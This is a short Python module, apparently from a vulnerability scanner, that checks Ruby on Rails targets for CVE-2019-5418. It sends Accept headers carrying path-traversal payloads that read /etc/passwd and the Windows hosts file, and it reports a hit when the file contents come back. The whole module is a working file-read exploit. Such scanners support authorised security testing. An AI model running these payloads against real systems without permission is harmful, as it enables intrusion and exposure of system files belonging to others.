#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2019_5418_payloads = [
    {'headers': {'Accept': '../../../../../../../../etc/passwd{{'}},
    {'headers': {'Accept': '../../../../../../../../C:/Windows/System32/drivers/etc/hosts{{'}},
    {'headers': {'Accept': '../../../../../../../../C:\Windows\System32\drivers\etc\hosts{{'}}
]

def cve_2019_5418_scan(clients):
    ''' 在控制器中通过render file形式来渲染应用之外的视图, 且会根据用户传入的Accept头来确定文件具体位置
        通过传入Accept: ../../../../../../../../etc/passwd{{头来构成构造路径穿越漏洞, 读取任意文件
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'Ruby on Rails',
        'vul_type': 'File-Read',
        'vul_id': 'CVE-2019-5418',
    }

    for payload in cve_2019_5418_payloads:
        headers = payload['headers']

        res = client.request(
            'get',
            '',
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
